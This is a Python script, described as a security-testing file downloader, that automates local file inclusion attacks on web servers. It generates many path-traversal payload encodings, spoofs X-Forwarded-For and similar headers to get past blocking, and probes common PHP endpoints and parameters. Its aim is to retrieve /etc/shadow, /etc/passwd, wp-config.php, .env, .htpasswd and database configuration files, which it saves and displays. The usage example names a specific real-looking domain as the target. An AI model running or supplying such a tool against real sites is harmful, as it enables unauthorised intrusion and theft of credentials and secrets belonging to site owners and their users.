#!/usr/bin/env python3
"""
Comprehensive File Downloader for Security Testing
Downloads sensitive files using LFI vulnerabilities
"""

import requests
import urllib.parse
import os
import time
from datetime import datetime
import json

class FileDownloader:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.downloaded_files = {}
        self.successful_downloads = 0
        
        # Successful bypass headers from previous testing
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        self.session.headers.update(self.headers)
    
    def generate_lfi_payloads(self, target_file):
        """Generate various LFI payload variations for a target file"""
        payloads = []
        
        # Basic path traversal
        for depth in range(1, 8):
            prefix = "../" * depth
            payloads.append(prefix + target_file)
        
        # URL encoded variations
        for depth in range(1, 6):
            prefix = "%2e%2e%2f" * depth
            payloads.append(prefix + target_file)
        
        # Double URL encoded
        for depth in range(1, 4):
            prefix = "%252e%252e%252f" * depth
            payloads.append(prefix + target_file)
        
        # Mixed encoding
        payloads.extend([
            f"..%2f..%2f..%2f{target_file}",
            f"%2e%2e/%2e%2e/%2e%2e/{target_file}",
            f"....//....//....//{target_file}",
            f"..%252f..%252f..%252f{target_file}",
            f"..\\..\\..\\{target_file}",
            f"%2e%2e%5c%2e%2e%5c%2e%2e%5c{target_file}",
            f"..%c0%af..%c0%af..%c0%af{target_file}",
            f"..%c1%9c..%c1%9c..%c1%9c{target_file}",
            f".%2e/.%2e/.%2e/{target_file}",
            f"%2e%2e%2f%2e%2e%2f%2e%2e%2f{target_file}"
        ])
        
        return payloads
    
    def test_file_download(self, target_file, description=""):
        """Test downloading a specific file using various LFI techniques"""
        print(f"\n🔍 Testing download: {target_file} ({description})")
        print("-" * 60)
        
        payloads = self.generate_lfi_payloads(target_file)
        vulnerable_params = ['page', 'file', 'include', 'path', 'dir', 'document', 'view', 'load', 'read']
        
        for param in vulnerable_params:
            for i, payload in enumerate(payloads):
                try:
                    # Test different endpoints
                    endpoints = [
                        f"{self.target_url}/index.php",
                        f"{self.target_url}/main.php",
                        f"{self.target_url}/view.php",
                        f"{self.target_url}/include.php"
                    ]
                    
                    for endpoint in endpoints:
                        params = {param: payload}
                        
                        response = self.session.get(endpoint, params=params, timeout=self.timeout)
                        
                        # Check for successful file content
                        if self.is_successful_download(response, target_file):
                            print(f"✅ SUCCESS! Downloaded via: {endpoint}?{param}={payload}")
                            
                            # Save the file content
                            self.save_downloaded_file(target_file, response.text, endpoint, param, payload)
                            return True
                        
                        # Add delay to avoid rate limiting
                        time.sleep(0.1)
                        
                except requests.RequestException as e:
                    continue
                except Exception as e:
                    continue
        
        print(f"❌ Failed to download: {target_file}")
        return False
    
    def is_successful_download(self, response, target_file):
        """Check if the response contains actual file content"""
        if response.status_code != 200:
            return False
        
        content = response.text.lower()
        
        # Check for Cloudflare blocking
        if "cloudflare" in content or "blocked" in content or "forbidden" in content:
            return False
        
        # File-specific indicators
        indicators = {
            "etc/passwd": ["root:", "bin:", "daemon:", "sys:", "/bin/bash", "/bin/sh"],
            "wp-config.php": ["db_name", "db_user", "db_password", "wp_", "mysql"],
            ".env": ["app_key", "db_", "mail_", "redis_", "aws_", "="],
            ".htaccess": ["rewriteengine", "rewriterule", "deny from", "allow from", "options"],
            "config.php": ["<?php", "database", "password", "host", "user"],
            "database.php": ["<?php", "database", "connection", "host", "port"],
            "settings.php": ["<?php", "settings", "config", "database"],
            "local_settings.py": ["debug", "database", "secret_key", "allowed_hosts"],
            "web.config": ["<configuration>", "<system.web>", "<appsettings>"]
        }
        
        # Check for specific file indicators
        for file_pattern, file_indicators in indicators.items():
            if file_pattern in target_file.lower():
                if any(indicator in content for indicator in file_indicators):
                    return True
        
        # Generic file content indicators
        if len(response.text) > 100 and not any(x in content for x in ["<html>", "<body>", "<!doctype"]):
            # Likely contains actual file content
            return True
        
        return False
    
    def save_downloaded_file(self, target_file, content, endpoint, param, payload):
        """Save downloaded file content"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"downloaded_{target_file.replace('/', '_').replace('\\', '_')}_{timestamp}.txt"
        
        # Create downloads directory
        os.makedirs("downloads", exist_ok=True)
        filepath = os.path.join("downloads", filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Downloaded from: {endpoint}?{param}={payload}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write(f"# Target File: {target_file}\n")
            f.write("-" * 80 + "\n\n")
            f.write(content)
        
        # Store in results
        self.downloaded_files[target_file] = {
            'filepath': filepath,
            'endpoint': endpoint,
            'param': param,
            'payload': payload,
            'timestamp': timestamp,
            'size': len(content)
        }
        
        self.successful_downloads += 1
        print(f"💾 Saved to: {filepath}")
        print(f"📊 File size: {len(content)} bytes")
    
    def run_comprehensive_download(self):
        """Run comprehensive file download testing"""
        print("🚀 Starting Comprehensive File Download Testing")
        print("=" * 60)
        print(f"Target: {self.target_url}")
        print(f"Timestamp: {datetime.now()}")
        print("=" * 60)
        
        # Target files to download
        target_files = [
            ("etc/passwd", "Linux user accounts"),
            ("etc/shadow", "Linux password hashes"),
            ("etc/hosts", "System hosts file"),
            ("etc/hostname", "System hostname"),
            ("proc/version", "Kernel version info"),
            ("proc/cpuinfo", "CPU information"),
            ("proc/meminfo", "Memory information"),
            ("wp-config.php", "WordPress configuration"),
            ("config.php", "PHP configuration"),
            ("database.php", "Database configuration"),
            ("settings.php", "Application settings"),
            (".env", "Environment variables"),
            (".htaccess", "Apache configuration"),
            (".htpasswd", "Apache passwords"),
            ("web.config", "IIS configuration"),
            ("composer.json", "PHP dependencies"),
            ("package.json", "Node.js dependencies"),
            ("local_settings.py", "Django local settings"),
            ("settings.py", "Django settings"),
            ("app/config/database.yml", "Rails database config"),
            ("application/config/database.php", "CodeIgniter database config"),
            ("sites/default/settings.php", "Drupal settings"),
            ("configuration.php", "Joomla configuration"),
            ("config/app.php", "Laravel app config"),
            ("config/database.php", "Laravel database config")
        ]
        
        successful_files = []
        
        for target_file, description in target_files:
            if self.test_file_download(target_file, description):
                successful_files.append(target_file)
        
        # Generate summary report
        self.generate_summary_report(successful_files)
        
        return successful_files
    
    def generate_summary_report(self, successful_files):
        """Generate comprehensive summary report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"download_summary_{timestamp}.md"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(f"# File Download Security Test Report\n\n")
            f.write(f"**Target:** {self.target_url}\n")
            f.write(f"**Test Date:** {datetime.now()}\n")
            f.write(f"**Total Successful Downloads:** {self.successful_downloads}\n\n")
            
            f.write("## 🎯 Successfully Downloaded Files\n\n")
            
            if successful_files:
                for target_file in successful_files:
                    if target_file in self.downloaded_files:
                        info = self.downloaded_files[target_file]
                        f.write(f"### {target_file}\n")
                        f.write(f"- **Local File:** `{info['filepath']}`\n")
                        f.write(f"- **Endpoint:** {info['endpoint']}\n")
                        f.write(f"- **Parameter:** {info['param']}\n")
                        f.write(f"- **Payload:** `{info['payload']}`\n")
                        f.write(f"- **File Size:** {info['size']} bytes\n")
                        f.write(f"- **Downloaded:** {info['timestamp']}\n\n")
            else:
                f.write("No files were successfully downloaded.\n\n")
            
            f.write("## 🔍 Technical Details\n\n")
            f.write("**Bypass Technique Used:**\n")
            f.write("- User-Agent: Mobile Android browser\n")
            f.write("- Headers: X-Forwarded-For, X-Real-IP spoofing\n")
            f.write("- Method: Local File Inclusion (LFI) with path traversal\n\n")
            
            f.write("## 📁 File Locations\n\n")
            f.write("All downloaded files are stored in the `downloads/` directory.\n")
        
        print(f"\n📋 Summary report generated: {report_file}")
        
        # Also generate JSON report
        json_report = f"download_results_{timestamp}.json"
        with open(json_report, 'w') as f:
            json.dump({
                'target_url': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'successful_downloads': self.successful_downloads,
                'downloaded_files': self.downloaded_files,
                'successful_files': successful_files
            }, f, indent=2)
        
        print(f"📊 JSON report generated: {json_report}")
    
    def display_downloaded_files(self):
        """Display content of all downloaded files"""
        print("\n" + "="*80)
        print("📁 DISPLAYING ALL DOWNLOADED FILES")
        print("="*80)
        
        if not self.downloaded_files:
            print("❌ No files were successfully downloaded.")
            return
        
        for target_file, info in self.downloaded_files.items():
            print(f"\n🔸 FILE: {target_file}")
            print(f"📍 Source: {info['endpoint']}?{info['param']}={info['payload']}")
            print(f"💾 Local: {info['filepath']}")
            print(f"📊 Size: {info['size']} bytes")
            print("-" * 60)
            
            try:
                with open(info['filepath'], 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Skip the header comments and show actual file content
                    lines = content.split('\n')
                    content_start = 0
                    for i, line in enumerate(lines):
                        if line.strip() == "-" * 80:
                            content_start = i + 2
                            break
                    
                    actual_content = '\n'.join(lines[content_start:])
                    if len(actual_content) > 2000:
                        print(actual_content[:2000] + "\n... [TRUNCATED] ...")
                    else:
                        print(actual_content)
            except Exception as e:
                print(f"❌ Error reading file: {e}")
            
            print("\n" + "="*60 + "\n")

def main():
    if len(os.sys.argv) < 2:
        print("Usage: python3 file_downloader.py <target_url>")
        print("Example: python3 file_downloader.py https://pakyok77.link")
        return
    
    target_url = os.sys.argv[1]
    if not target_url.startswith('http'):
        target_url = 'https://' + target_url
    
    downloader = FileDownloader(target_url)
    successful_files = downloader.run_comprehensive_download()
    
    print("\n" + "="*80)
    print("🎯 DOWNLOAD TESTING COMPLETED")
    print("="*80)
    print(f"✅ Successfully downloaded {len(successful_files)} files:")
    for file in successful_files:
        print(f"   - {file}")
    
    if successful_files:
        print("\n🔍 Displaying file contents...")
        downloader.display_downloaded_files()
    
    print(f"\n📋 Check the summary reports for detailed information.")

if __name__ == "__main__":
    main()